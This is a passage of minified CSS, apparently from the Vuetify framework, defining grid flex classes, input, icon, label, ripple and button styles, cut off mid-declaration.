auto;flex-wrap:nowrap;min-width:0}.layout.reverse{flex-direction:row-reverse}.layout.column{flex-direction:column}.layout.column.reverse{flex-direction:column-reverse}.layout.column>.flex{max-width:100%}.layout.wrap{flex-wrap:wrap}.layout.grow-shrink-0{flex-grow:0;flex-shrink:0}@media (min-width:0){.flex.xs12{flex-basis:100%;flex-grow:0;max-width:100%}.flex.order-xs12{order:12}.flex.xs11{flex-basis:91.6666666667%;flex-grow:0;max-width:91.6666666667%}.flex.order-xs11{order:11}.flex.xs10{flex-basis:83.3333333333%;flex-grow:0;max-width:83.3333333333%}.flex.order-xs10{order:10}.flex.xs9{flex-basis:75%;flex-grow:0;max-width:75%}.flex.order-xs9{order:9}.flex.xs8{flex-basis:66.6666666667%;flex-grow:0;max-width:66.6666666667%}.flex.order-xs8{order:8}.flex.xs7{flex-basis:58.3333333333%;flex-grow:0;max-width:58.3333333333%}.flex.order-xs7{order:7}.flex.xs6{flex-basis:50%;flex-grow:0;max-width:50%}.flex.order-xs6{order:6}.flex.xs5{flex-basis:41.6666666667%;flex-grow:0;max-width:41.6666666667%}.flex.order-xs5{order:5}.flex.xs4{flex-basis:33.3333333333%;flex-grow:0;max-width:33.3333333333%}.flex.order-xs4{order:4}.flex.xs3{flex-basis:25%;flex-grow:0;max-width:25%}.flex.order-xs3{order:3}.flex.xs2{flex-basis:16.6666666667%;flex-grow:0;max-width:16.6666666667%}.flex.order-xs2{order:2}.flex.xs1{flex-basis:8.3333333333%;flex-grow:0;max-width:8.3333333333%}.flex.order-xs1{order:1}.v-application--is-ltr .flex.offset-xs12{margin-left:100%}.v-application--is-rtl .flex.offset-xs12{margin-right:100%}.v-application--is-ltr .flex.offset-xs11{margin-left:91.6666666667%}.v-application--is-rtl .flex.offset-xs11{margin-right:91.6666666667%}.v-application--is-ltr .flex.offset-xs10{margin-left:83.3333333333%}.v-application--is-rtl .flex.offset-xs10{margin-right:83.3333333333%}.v-application--is-ltr .flex.offset-xs9{margin-left:75%}.v-application--is-rtl .flex.offset-xs9{margin-right:75%}.v-application--is-ltr .flex.offset-xs8{margin-left:66.6666666667%}.v-application--is-rtl .flex.offset-xs8{margin-right:66.6666666667%}.v-application--is-ltr .flex.offset-xs7{margin-left:58.3333333333%}.v-application--is-rtl .flex.offset-xs7{margin-right:58.3333333333%}.v-application--is-ltr .flex.offset-xs6{margin-left:50%}.v-application--is-rtl .flex.offset-xs6{margin-right:50%}.v-application--is-ltr .flex.offset-xs5{margin-left:41.6666666667%}.v-application--is-rtl .flex.offset-xs5{margin-right:41.6666666667%}.v-application--is-ltr .flex.offset-xs4{margin-left:33.3333333333%}.v-application--is-rtl .flex.offset-xs4{margin-right:33.3333333333%}.v-application--is-ltr .flex.offset-xs3{margin-left:25%}.v-application--is-rtl .flex.offset-xs3{margin-right:25%}.v-application--is-ltr .flex.offset-xs2{margin-left:16.6666666667%}.v-application--is-rtl .flex.offset-xs2{margin-right:16.6666666667%}.v-application--is-ltr .flex.offset-xs1{margin-left:8.3333333333%}.v-application--is-rtl .flex.offset-xs1{margin-right:8.3333333333%}.v-application--is-ltr .flex.offset-xs0{margin-left:0}.v-application--is-rtl .flex.offset-xs0{margin-right:0}}@media (min-width:600px){.flex.sm12{flex-basis:100%;flex-grow:0;max-width:100%}.flex.order-sm12{order:12}.flex.sm11{flex-basis:91.6666666667%;flex-grow:0;max-width:91.6666666667%}.flex.order-sm11{order:11}.flex.sm10{flex-basis:83.3333333333%;flex-grow:0;max-width:83.3333333333%}.flex.order-sm10{order:10}.flex.sm9{flex-basis:75%;flex-grow:0;max-width:75%}.flex.order-sm9{order:9}.flex.sm8{flex-basis:66.6666666667%;flex-grow:0;max-width:66.6666666667%}.flex.order-sm8{order:8}.flex.sm7{flex-basis:58.3333333333%;flex-grow:0;max-width:58.3333333333%}.flex.order-sm7{order:7}.flex.sm6{flex-basis:50%;flex-grow:0;max-width:50%}.flex.order-sm6{order:6}.flex.sm5{flex-basis:41.6666666667%;flex-grow:0;max-width:41.6666666667%}.flex.order-sm5{order:5}.flex.sm4{flex-basis:33.3333333333%;flex-grow:0;max-width:33.3333333333%}.flex.order-sm4{order:4}.flex.sm3{flex-basis:25%;flex-grow:0;max-width:25%}.flex.order-sm3{order:3}.flex.sm2{flex-basis:16.6666666667%;flex-grow:0;max-width:16.6666666667%}.flex.order-sm2{order:2}.flex.sm1{flex-basis:8.3333333333%;flex-grow:0;max-width:8.3333333333%}.flex.order-sm1{order:1}.v-application--is-ltr .flex.offset-sm12{margin-left:100%}.v-application--is-rtl .flex.offset-sm12{margin-right:100%}.v-application--is-ltr .flex.offset-sm11{margin-left:91.6666666667%}.v-application--is-rtl .flex.offset-sm11{margin-right:91.6666666667%}.v-application--is-ltr .flex.offset-sm10{margin-left:83.3333333333%}.v-application--is-rtl .flex.offset-sm10{margin-right:83.3333333333%}.v-application--is-ltr .flex.offset-sm9{margin-left:75%}.v-application--is-rtl .flex.offset-sm9{margin-right:75%}.v-application--is-ltr .flex.offset-sm8{margin-left:66.6666666667%}.v-application--is-rtl .flex.offset-sm8{margin-right:66.6666666667%}.v-application--is-ltr .flex.offset-sm7{margin-left:58.3333333333%}.v-application--is-rtl .flex.offset-sm7{margin-right:58.3333333333%}.v-application--is-ltr .flex.offset-sm6{margin-left:50%}.v-application--is-rtl .flex.offset-sm6{margin-right:50%}.v-application--is-ltr .flex.offset-sm5{margin-left:41.6666666667%}.v-application--is-rtl .flex.offset-sm5{margin-right:41.6666666667%}.v-application--is-ltr .flex.offset-sm4{margin-left:33.3333333333%}.v-application--is-rtl .flex.offset-sm4{margin-right:33.3333333333%}.v-application--is-ltr .flex.offset-sm3{margin-left:25%}.v-application--is-rtl .flex.offset-sm3{margin-right:25%}.v-application--is-ltr .flex.offset-sm2{margin-left:16.6666666667%}.v-application--is-rtl .flex.offset-sm2{margin-right:16.6666666667%}.v-application--is-ltr .flex.offset-sm1{margin-left:8.3333333333%}.v-application--is-rtl .flex.offset-sm1{margin-right:8.3333333333%}.v-application--is-ltr .flex.offset-sm0{margin-left:0}.v-application--is-rtl .flex.offset-sm0{margin-right:0}}@media (min-width:960px){.flex.md12{flex-basis:100%;flex-grow:0;max-width:100%}.flex.order-md12{order:12}.flex.md11{flex-basis:91.6666666667%;flex-grow:0;max-width:91.6666666667%}.flex.order-md11{order:11}.flex.md10{flex-basis:83.3333333333%;flex-grow:0;max-width:83.3333333333%}.flex.order-md10{order:10}.flex.md9{flex-basis:75%;flex-grow:0;max-width:75%}.flex.order-md9{order:9}.flex.md8{flex-basis:66.6666666667%;flex-grow:0;max-width:66.6666666667%}.flex.order-md8{order:8}.flex.md7{flex-basis:58.3333333333%;flex-grow:0;max-width:58.3333333333%}.flex.order-md7{order:7}.flex.md6{flex-basis:50%;flex-grow:0;max-width:50%}.flex.order-md6{order:6}.flex.md5{flex-basis:41.6666666667%;flex-grow:0;max-width:41.6666666667%}.flex.order-md5{order:5}.flex.md4{flex-basis:33.3333333333%;flex-grow:0;max-width:33.3333333333%}.flex.order-md4{order:4}.flex.md3{flex-basis:25%;flex-grow:0;max-width:25%}.flex.order-md3{order:3}.flex.md2{flex-basis:16.6666666667%;flex-grow:0;max-width:16.6666666667%}.flex.order-md2{order:2}.flex.md1{flex-basis:8.3333333333%;flex-grow:0;max-width:8.3333333333%}.flex.order-md1{order:1}.v-application--is-ltr .flex.offset-md12{margin-left:100%}.v-application--is-rtl .flex.offset-md12{margin-right:100%}.v-application--is-ltr .flex.offset-md11{margin-left:91.6666666667%}.v-application--is-rtl .flex.offset-md11{margin-right:91.6666666667%}.v-application--is-ltr .flex.offset-md10{margin-left:83.3333333333%}.v-application--is-rtl .flex.offset-md10{margin-right:83.3333333333%}.v-application--is-ltr .flex.offset-md9{margin-left:75%}.v-application--is-rtl .flex.offset-md9{margin-right:75%}.v-application--is-ltr .flex.offset-md8{margin-left:66.6666666667%}.v-application--is-rtl .flex.offset-md8{margin-right:66.6666666667%}.v-application--is-ltr .flex.offset-md7{margin-left:58.3333333333%}.v-application--is-rtl .flex.offset-md7{margin-right:58.3333333333%}.v-application--is-ltr .flex.offset-md6{margin-left:50%}.v-application--is-rtl .flex.offset-md6{margin-right:50%}.v-application--is-ltr .flex.offset-md5{margin-left:41.6666666667%}.v-application--is-rtl .flex.offset-md5{margin-right:41.6666666667%}.v-application--is-ltr .flex.offset-md4{margin-left:33.3333333333%}.v-application--is-rtl .flex.offset-md4{margin-right:33.3333333333%}.v-application--is-ltr .flex.offset-md3{margin-left:25%}.v-application--is-rtl .flex.offset-md3{margin-right:25%}.v-application--is-ltr .flex.offset-md2{margin-left:16.6666666667%}.v-application--is-rtl .flex.offset-md2{margin-right:16.6666666667%}.v-application--is-ltr .flex.offset-md1{margin-left:8.3333333333%}.v-application--is-rtl .flex.offset-md1{margin-right:8.3333333333%}.v-application--is-ltr .flex.offset-md0{margin-left:0}.v-application--is-rtl .flex.offset-md0{margin-right:0}}@media (min-width:1264px){.flex.lg12{flex-basis:100%;flex-grow:0;max-width:100%}.flex.order-lg12{order:12}.flex.lg11{flex-basis:91.6666666667%;flex-grow:0;max-width:91.6666666667%}.flex.order-lg11{order:11}.flex.lg10{flex-basis:83.3333333333%;flex-grow:0;max-width:83.3333333333%}.flex.order-lg10{order:10}.flex.lg9{flex-basis:75%;flex-grow:0;max-width:75%}.flex.order-lg9{order:9}.flex.lg8{flex-basis:66.6666666667%;flex-grow:0;max-width:66.6666666667%}.flex.order-lg8{order:8}.flex.lg7{flex-basis:58.3333333333%;flex-grow:0;max-width:58.3333333333%}.flex.order-lg7{order:7}.flex.lg6{flex-basis:50%;flex-grow:0;max-width:50%}.flex.order-lg6{order:6}.flex.lg5{flex-basis:41.6666666667%;flex-grow:0;max-width:41.6666666667%}.flex.order-lg5{order:5}.flex.lg4{flex-basis:33.3333333333%;flex-grow:0;max-width:33.3333333333%}.flex.order-lg4{order:4}.flex.lg3{flex-basis:25%;flex-grow:0;max-width:25%}.flex.order-lg3{order:3}.flex.lg2{flex-basis:16.6666666667%;flex-grow:0;max-width:16.6666666667%}.flex.order-lg2{order:2}.flex.lg1{flex-basis:8.3333333333%;flex-grow:0;max-width:8.3333333333%}.flex.order-lg1{order:1}.v-application--is-ltr .flex.offset-lg12{margin-left:100%}.v-application--is-rtl .flex.offset-lg12{margin-right:100%}.v-application--is-ltr .flex.offset-lg11{margin-left:91.6666666667%}.v-application--is-rtl .flex.offset-lg11{margin-right:91.6666666667%}.v-application--is-ltr .flex.offset-lg10{margin-left:83.3333333333%}.v-application--is-rtl .flex.offset-lg10{margin-right:83.3333333333%}.v-application--is-ltr .flex.offset-lg9{margin-left:75%}.v-application--is-rtl .flex.offset-lg9{margin-right:75%}.v-application--is-ltr .flex.offset-lg8{margin-left:66.6666666667%}.v-application--is-rtl .flex.offset-lg8{margin-right:66.6666666667%}.v-application--is-ltr .flex.offset-lg7{margin-left:58.3333333333%}.v-application--is-rtl .flex.offset-lg7{margin-right:58.3333333333%}.v-application--is-ltr .flex.offset-lg6{margin-left:50%}.v-application--is-rtl .flex.offset-lg6{margin-right:50%}.v-application--is-ltr .flex.offset-lg5{margin-left:41.6666666667%}.v-application--is-rtl .flex.offset-lg5{margin-right:41.6666666667%}.v-application--is-ltr .flex.offset-lg4{margin-left:33.3333333333%}.v-application--is-rtl .flex.offset-lg4{margin-right:33.3333333333%}.v-application--is-ltr .flex.offset-lg3{margin-left:25%}.v-application--is-rtl .flex.offset-lg3{margin-right:25%}.v-application--is-ltr .flex.offset-lg2{margin-left:16.6666666667%}.v-application--is-rtl .flex.offset-lg2{margin-right:16.6666666667%}.v-application--is-ltr .flex.offset-lg1{margin-left:8.3333333333%}.v-application--is-rtl .flex.offset-lg1{margin-right:8.3333333333%}.v-application--is-ltr .flex.offset-lg0{margin-left:0}.v-application--is-rtl .flex.offset-lg0{margin-right:0}}@media (min-width:1904px){.flex.xl12{flex-basis:100%;flex-grow:0;max-width:100%}.flex.order-xl12{order:12}.flex.xl11{flex-basis:91.6666666667%;flex-grow:0;max-width:91.6666666667%}.flex.order-xl11{order:11}.flex.xl10{flex-basis:83.3333333333%;flex-grow:0;max-width:83.3333333333%}.flex.order-xl10{order:10}.flex.xl9{flex-basis:75%;flex-grow:0;max-width:75%}.flex.order-xl9{order:9}.flex.xl8{flex-basis:66.6666666667%;flex-grow:0;max-width:66.6666666667%}.flex.order-xl8{order:8}.flex.xl7{flex-basis:58.3333333333%;flex-grow:0;max-width:58.3333333333%}.flex.order-xl7{order:7}.flex.xl6{flex-basis:50%;flex-grow:0;max-width:50%}.flex.order-xl6{order:6}.flex.xl5{flex-basis:41.6666666667%;flex-grow:0;max-width:41.6666666667%}.flex.order-xl5{order:5}.flex.xl4{flex-basis:33.3333333333%;flex-grow:0;max-width:33.3333333333%}.flex.order-xl4{order:4}.flex.xl3{flex-basis:25%;flex-grow:0;max-width:25%}.flex.order-xl3{order:3}.flex.xl2{flex-basis:16.6666666667%;flex-grow:0;max-width:16.6666666667%}.flex.order-xl2{order:2}.flex.xl1{flex-basis:8.3333333333%;flex-grow:0;max-width:8.3333333333%}.flex.order-xl1{order:1}.v-application--is-ltr .flex.offset-xl12{margin-left:100%}.v-application--is-rtl .flex.offset-xl12{margin-right:100%}.v-application--is-ltr .flex.offset-xl11{margin-left:91.6666666667%}.v-application--is-rtl .flex.offset-xl11{margin-right:91.6666666667%}.v-application--is-ltr .flex.offset-xl10{margin-left:83.3333333333%}.v-application--is-rtl .flex.offset-xl10{margin-right:83.3333333333%}.v-application--is-ltr .flex.offset-xl9{margin-left:75%}.v-application--is-rtl .flex.offset-xl9{margin-right:75%}.v-application--is-ltr .flex.offset-xl8{margin-left:66.6666666667%}.v-application--is-rtl .flex.offset-xl8{margin-right:66.6666666667%}.v-application--is-ltr .flex.offset-xl7{margin-left:58.3333333333%}.v-application--is-rtl .flex.offset-xl7{margin-right:58.3333333333%}.v-application--is-ltr .flex.offset-xl6{margin-left:50%}.v-application--is-rtl .flex.offset-xl6{margin-right:50%}.v-application--is-ltr .flex.offset-xl5{margin-left:41.6666666667%}.v-application--is-rtl .flex.offset-xl5{margin-right:41.6666666667%}.v-application--is-ltr .flex.offset-xl4{margin-left:33.3333333333%}.v-application--is-rtl .flex.offset-xl4{margin-right:33.3333333333%}.v-application--is-ltr .flex.offset-xl3{margin-left:25%}.v-application--is-rtl .flex.offset-xl3{margin-right:25%}.v-application--is-ltr .flex.offset-xl2{margin-left:16.6666666667%}.v-application--is-rtl .flex.offset-xl2{margin-right:16.6666666667%}.v-application--is-ltr .flex.offset-xl1{margin-left:8.3333333333%}.v-application--is-rtl .flex.offset-xl1{margin-right:8.3333333333%}.v-application--is-ltr .flex.offset-xl0{margin-left:0}.v-application--is-rtl .flex.offset-xl0{margin-right:0}}.child-flex>*,.flex{flex:1 1 auto;max-width:100%}.child-flex>.grow-shrink-0,.flex.grow-shrink-0{flex-grow:0;flex-shrink:0}.grow,.spacer{flex-grow:1!important}.grow{flex-shrink:0!important}.shrink{flex-grow:0!important;flex-shrink:1!important}.fill-height{height:100%}
.v-input--checkbox.v-input--indeterminate.v-input--is-disabled{opacity:.6}
.theme--light.v-input--selection-controls.v-input--is-disabled:not(.v-input--indeterminate) .v-icon{color:rgba(0,0,0,.26)!important}.theme--dark.v-input--selection-controls.v-input--is-disabled:not(.v-input--indeterminate) .v-icon{color:hsla(0,0%,100%,.3)!important}.v-input--selection-controls{margin-top:16px;padding-top:4px}.v-input--selection-controls>.v-input__append-outer,.v-input--selection-controls>.v-input__prepend-outer{margin-top:0;margin-bottom:0}.v-input--selection-controls:not(.v-input--hide-details)>.v-input__slot{margin-bottom:12px}.v-input--selection-controls .v-input__slot,.v-input--selection-controls .v-radio{cursor:pointer}.v-input--selection-controls .v-input__slot>.v-label,.v-input--selection-controls .v-radio>.v-label{align-items:center;display:inline-flex;flex:1 1 auto;height:auto}.v-input--selection-controls__input{color:inherit;display:inline-flex;flex:0 0 auto;height:24px;position:relative;transition:.3s cubic-bezier(.25,.8,.5,1);transition-property:transform;width:24px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.v-input--selection-controls__input .v-icon{width:100%}.v-application--is-ltr .v-input--selection-controls__input{margin-right:8px}.v-application--is-rtl .v-input--selection-controls__input{margin-left:8px}.v-input--selection-controls__input input[role=checkbox],.v-input--selection-controls__input input[role=radio],.v-input--selection-controls__input input[role=switch]{position:absolute;opacity:0;width:100%;height:100%;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.v-input--selection-controls__input+.v-label{cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.v-input--selection-controls__ripple{border-radius:50%;cursor:pointer;height:34px;position:absolute;transition:inherit;width:34px;left:-12px;top:calc(50% - 24px);margin:7px}.v-input--selection-controls__ripple:before{border-radius:inherit;bottom:0;content:"";position:absolute;opacity:.2;left:0;right:0;top:0;transform-origin:center center;transform:scale(.2);transition:inherit}.v-input--selection-controls__ripple>.v-ripple__container{transform:scale(1.2)}.v-input--selection-controls.v-input--dense .v-input--selection-controls__ripple{width:28px;height:28px;left:-9px}.v-input--selection-controls.v-input--dense:not(.v-input--switch) .v-input--selection-controls__ripple{top:calc(50% - 21px)}.v-input--selection-controls.v-input{flex:0 1 auto}.v-input--selection-controls.v-input--is-focused .v-input--selection-controls__ripple:before,.v-input--selection-controls .v-radio--is-focused .v-input--selection-controls__ripple:before{background:currentColor;transform:scale(1.2)}.v-input--selection-controls .v-input--selection-controls__input:hover .v-input--selection-controls__ripple:before{background:currentColor;transform:scale(1.2);transition:none}
.theme--light.v-icon{color:rgba(0,0,0,.54)}.theme--light.v-icon:focus:after{opacity:.12}.theme--light.v-icon.v-icon.v-icon--disabled{color:rgba(0,0,0,.38)!important}.theme--dark.v-icon{color:#fff}.theme--dark.v-icon:focus:after{opacity:.24}.theme--dark.v-icon.v-icon.v-icon--disabled{color:hsla(0,0%,100%,.5)!important}.v-icon.v-icon{align-items:center;display:inline-flex;font-feature-settings:"liga";font-size:24px;justify-content:center;letter-spacing:normal;line-height:1;position:relative;text-indent:0;transition:.3s cubic-bezier(.25,.8,.5,1),visibility 0s;vertical-align:middle;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.v-icon.v-icon:after{background-color:currentColor;border-radius:50%;content:"";display:inline-block;height:100%;left:0;opacity:0;pointer-events:none;position:absolute;top:0;transform:scale(1.3);width:100%;transition:opacity .2s cubic-bezier(.4,0,.6,1)}.v-icon.v-icon--dense{font-size:20px}.v-icon--right{margin-left:8px}.v-icon--left{margin-right:8px}.v-icon.v-icon.v-icon--link{cursor:pointer;outline:none}.v-icon--disabled{pointer-events:none}.v-icon--is-component,.v-icon--svg{height:24px;width:24px}.v-icon--svg{fill:currentColor}.v-icon--dense--is-component{height:20px}
.theme--light.v-input,.theme--light.v-input input,.theme--light.v-input textarea{color:rgba(0,0,0,.87)}.theme--light.v-input input::-moz-placeholder,.theme--light.v-input textarea::-moz-placeholder{color:rgba(0,0,0,.38)}.theme--light.v-input input:-ms-input-placeholder,.theme--light.v-input textarea:-ms-input-placeholder{color:rgba(0,0,0,.38)}.theme--light.v-input input::placeholder,.theme--light.v-input textarea::placeholder{color:rgba(0,0,0,.38)}.theme--light.v-input--is-disabled,.theme--light.v-input--is-disabled input,.theme--light.v-input--is-disabled textarea{color:rgba(0,0,0,.38)}.theme--dark.v-input,.theme--dark.v-input input,.theme--dark.v-input textarea{color:#fff}.theme--dark.v-input input::-moz-placeholder,.theme--dark.v-input textarea::-moz-placeholder{color:hsla(0,0%,100%,.5)}.theme--dark.v-input input:-ms-input-placeholder,.theme--dark.v-input textarea:-ms-input-placeholder{color:hsla(0,0%,100%,.5)}.theme--dark.v-input input::placeholder,.theme--dark.v-input textarea::placeholder{color:hsla(0,0%,100%,.5)}.theme--dark.v-input--is-disabled,.theme--dark.v-input--is-disabled input,.theme--dark.v-input--is-disabled textarea{color:hsla(0,0%,100%,.5)}.v-input{align-items:flex-start;display:flex;flex:1 1 auto;font-size:16px;letter-spacing:normal;max-width:100%;text-align:left}.v-input .v-progress-linear{top:calc(100% - 1px);left:0}.v-input input{max-height:32px}.v-input input:invalid,.v-input textarea:invalid{box-shadow:none}.v-input input:active,.v-input input:focus,.v-input textarea:active,.v-input textarea:focus{outline:none}.v-input .v-label{height:20px;line-height:20px}.v-input__append-outer,.v-input__prepend-outer{display:inline-flex;margin-bottom:4px;margin-top:4px;line-height:1}.v-input__append-outer .v-icon,.v-input__prepend-outer .v-icon{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.v-application--is-ltr .v-input__append-outer{margin-left:9px}.v-application--is-ltr .v-input__prepend-outer,.v-application--is-rtl .v-input__append-outer{margin-right:9px}.v-application--is-rtl .v-input__prepend-outer{margin-left:9px}.v-input__control{display:flex;flex-direction:column;height:auto;flex-grow:1;flex-wrap:wrap;min-width:0;width:100%}.v-input__icon{align-items:center;display:inline-flex;height:24px;flex:1 0 auto;justify-content:center;min-width:24px;width:24px}.v-input__icon--clear{border-radius:50%}.v-input__icon--clear .v-icon--disabled{visibility:hidden}.v-input__slot{align-items:center;color:inherit;display:flex;margin-bottom:8px;min-height:inherit;position:relative;transition:.3s cubic-bezier(.25,.8,.5,1);width:100%}.v-input--dense>.v-input__control>.v-input__slot{margin-bottom:4px}.v-input--is-disabled:not(.v-input--is-readonly){pointer-events:none}.v-input--is-loading>.v-input__control>.v-input__slot:after,.v-input--is-loading>.v-input__control>.v-input__slot:before{display:none}.v-input--hide-details>.v-input__control>.v-input__slot{margin-bottom:0}.v-input--has-state.error--text .v-label{-webkit-animation:v-shake .6s cubic-bezier(.25,.8,.5,1);animation:v-shake .6s cubic-bezier(.25,.8,.5,1)}
.theme--light.v-label{color:rgba(0,0,0,.6)}.theme--light.v-label--is-disabled{color:rgba(0,0,0,.38)}.theme--dark.v-label{color:hsla(0,0%,100%,.7)}.theme--dark.v-label--is-disabled{color:hsla(0,0%,100%,.5)}.v-label{font-size:16px;line-height:1;min-height:8px;transition:.3s cubic-bezier(.25,.8,.5,1)}
.theme--light.v-messages{color:rgba(0,0,0,.6)}.theme--dark.v-messages{color:hsla(0,0%,100%,.7)}.v-messages{flex:1 1 auto;font-size:12px;min-height:14px;min-width:1px;position:relative}.v-application--is-ltr .v-messages{text-align:left}.v-application--is-rtl .v-messages{text-align:right}.v-messages__message{line-height:12px;word-break:break-word;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto}
.v-ripple__container{border-radius:inherit;width:100%;height:100%;z-index:0;contain:strict}.v-ripple__animation,.v-ripple__container{color:inherit;position:absolute;left:0;top:0;overflow:hidden;pointer-events:none}.v-ripple__animation{border-radius:50%;background:currentColor;opacity:0;will-change:transform,opacity}.v-ripple__animation--enter{transition:none}.v-ripple__animation--in{transition:transform .25s cubic-bezier(.4,0,.2,1),opacity .1s cubic-bezier(.4,0,.2,1)}.v-ripple__animation--out{transition:opacity .3s cubic-bezier(.4,0,.2,1)}
.v-btn:not(.v-btn--outlined).accent,.v-btn:not(.v-btn--outlined).error,.v-btn:not(.v-btn--outlined).info,.v-btn:not(.v-btn--outlined).primary,.v-btn:not(.v-btn--outlined).secondary,.v-btn:not(.v-btn--outlined).success,.v-btn:not(.v-btn--outlined).warning{color:#fff}.theme--light.v-btn{color:rgba(0,0,0,.87)}.theme--light.v-btn.v-btn--disabled,.theme--light.v-btn.v-btn--disabled .v-btn__loading,.theme--light.v-btn.v-btn--disabled .v-icon{color:rgba(0,0,0,.26)!important}.theme--light.v-btn.v-btn--disabled:not(.v-btn--flat):not(.v-btn--text):not(.v-btn--outlined){background-color:rgba(0,0,0,.12)!important}.theme--light.v-btn:not(.v-btn--flat):not(.v-btn--text):not(.v-btn--outlined){background-color:#f5f5f5}.theme--light.v-btn.v-btn--outlined.v-btn--text{border-color:rgba(0,0,0,.12)}.theme--light.v-btn.v-btn--icon{color:rgba(0,0,0,.54)}.theme--light.v-btn:hover:before{opacity:.04}.theme--light.v-btn--active:before,.theme--light.v-btn--active:hover:before,.theme--light.v-btn:focus:before{opacity:.12}.theme--light.v-btn--active:focus:before{opacity:.16}.theme--dark.v-btn{color:#fff}.theme--dark.v-btn.v-btn--disabled,.theme--dark.v-btn.v-btn--disabled .v-btn__loading,.theme--dark.v-btn.v-btn--disabled .v-icon{color:hsla(0,0%,100%,.3)!important}.theme--dark.v-btn.v-btn--disabled:not(.v-btn--flat):not(.v-btn--text):not(.v-btn--outlined){background-color:hsla(0,0%,100%,.12)!important}.theme--dark.v-btn:not(.v-btn--flat):not(.v-btn--text):not(.v-btn--outlined){background-color:#272727}.theme--dark.v-btn.v-btn--outlined.v-btn--text{border-color:hsla(0,0%,100%,.12)}.theme--dark.v-btn.v-btn--icon{color:#fff}.theme--dark.v-btn:hover:before{opacity:.08}.theme--dark.v-btn--active:before,.theme--dark.v-btn--active:hover:before,.theme--dark.v-btn:focus:before{opacity:.24}.theme--dark.v-btn--active:focus:before{opacity:.32}.v-btn{align-items:center;border-radius:4px;display:inline-flex;flex:0 0 auto;font-weight:500;letter-spacing:.0892857143em;justify-content:center;outline:0;position:relative;text-decoration:none;text-indent:.0892857143em;text-transform:uppercase;transition-duration:.28s;transition-property:box-shadow,transform,opacity;transition-timing-function:cubic-bezier(.4,0,.2,1);-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;vertical-align:middle;white-space:nowrap}.v-btn.v-size--x-small{font-size:.625rem}.v-btn.v-size--small{font-size:.75rem}.v-btn.v-size--default,.v-btn.v-size--large{font-size:.875rem}.v-btn.v-size--x-large{font-size:1rem}.v-btn:before{border-radius:inherit;bottom:0;color:inherit;content:"";left:0;opacity:0;pointer-events:none;position:absolute;right:0;top:0;transition:opacity .2s cubic-bezier(.4,0,.6,1);background-color:currentColor}.v-btn:not(.v-btn--disabled){will-change:box-shadow}.v-btn:not(.v-btn--round).v-size--x-small{height:20px;min-width:36px;padding:0 8.8888888889px}.v-btn:not(.v-btn--round).v-size--small{height:28px;min-width:50px;padding:0 12.4444444444px}.v-btn:not(.v-btn--round).v-size--default{height:36px;min-width:64px;padding:0 16px}.v-btn:not(.v-btn--round).v-size--large{height:44px;min-width:78px;padding:0 19.5555555556px}.v-btn:not(.v-btn--round).v-size--x-large{height:52px;min-width:92px;padding:0 23.1111111111px}.v-btn>.v-btn__content .v-icon{color:inherit}.v-btn__content{align-items:center;color:inherit;display:flex;flex:1 0 auto;justify-content:inherit;line-height:normal;position:relative}.v-btn__content .v-icon--left,.v-btn__content .v-icon--right{font-size:18px;height:18px;width:18px}.v-application--is-ltr .v-btn__content .v-icon--left{margin-left:-4px;margin-right:8px}.v-application--is-ltr .v-btn__content .v-icon--right,.v-application--is-rtl .v-btn__content .v-icon--left{margin-left:8px;margin-right:-4px}.v-application--is-rtl .v-btn__content .v-icon--right{margin-left:-4px;margin-right:8px}.v-btn__loader{align-items:center;display:flex;height:100%;justify-content:center;left:0;position:absolute;top:0;width:100%}.v-btn:not(.v-btn--text):not(.v-btn--outlined).v-btn--active:before{opacity:.18}.v-btn:not(.v-btn--text):not(.v-btn--outlined):hover:before{opacity:.08}.v-btn:not(.v-btn--text):not(.v-btn--outlined):focus:before{opacity:.24}.v-btn--absolute,.v-btn--fixed{position:absolute}.v-btn--absolute.v-btn--right,.v-btn--fixed.v-btn--right{right:16px}.v-btn--absolute.v-btn--left,.v-btn--fixed.v-btn--left{left:16px}.v-btn--absolute.v-btn--top,.v-btn--fixed.v-btn--top{top:16px}.v-btn--absolute.v-btn--bottom,.v-btn--fixed.v-btn--bottom{bottom:16px}.v-btn--block{display:flex;flex:1 0 auto;min-width:100%!important;max-width:auto}.v-btn--contained{box-shadow:0 3px 1px -2px rgba(0,0,0,.2),0 2px 2px 0 rgba(0,0,0,.14),0 1px 5px 0 rgba(0,0,0,.12)}.v-btn--contained:after{box-shadow:0 2px 4px -1px rgba(0,0,0,.2),0 4px 5px 0 rgba(0,0,0,.14),0 1px 10px 0 rgba(0,0,0,.12)}.v-btn--contained:active{box-shadow:0 5px 5px -3px rgba(0,0,0,.2),0 8px 10px 1px rgba(0,0,0,.14),0 3px 14px 2px rgba(0,0,0,.12)}.v-btn--depressed{box-shadow:none!important}.v-btn--disabled{box-shadow:none;pointer-events:none}.v-btn--fab,.v-btn--icon{min-height:0;min-width:0;padding:0}.v-btn--fab.v-size--x-small .v-icon,.v-btn--icon.v-size--x-small .v-icon{height:18px;font-size:18px;width:18px}.v-btn--fab.v-size--default .v-icon,.v-btn--fab.v-size--small .v-icon,.v-btn--icon.v-size--default .v-icon,.v-btn--icon.v-size--small .v-icon{height:24px;font-size:24px;width:24px}.v-btn--fab.v-size--large .v-icon,.v-btn--icon.v-size--large .v-icon{height:28px;font-size:28px;width:28px}.v-btn--fab.v-size--x-large .v-icon,.v-btn--icon.v-size--x-large .v-icon{height:32px;font-size:32px;width:32px}.v-btn--icon.v-size--x-small{height:20px;width:20px}.v-btn--icon.v-size--small{height:28px;width:28px}.v-btn--icon.v-size--default{height:36px;width:36px}.v-btn--icon.v-size--large{height:44px;width:44px}.v-btn--icon.v-size--x-large{height:52px;width:52px}.v-btn--fab.v-btn--contained{box-shadow:0 3px 5px -1px rgba(0,0,0,.2),0 6px 10px 0 rgba(0,0,0,.14),0 1px 18px 0 rgba(0,0,0,.12)}.v-btn--fab.v-btn--contained:after{box-shadow:0 5px 5px -3px rgba(0,0,0,.2),0 8px 10px 1px rgba(0,0,0,.14),0 3px 14px 2px rgba(0,0,0,.12)}.v-btn--fab.v-btn--contained:active{box-shadow:0 7px 8px -4px 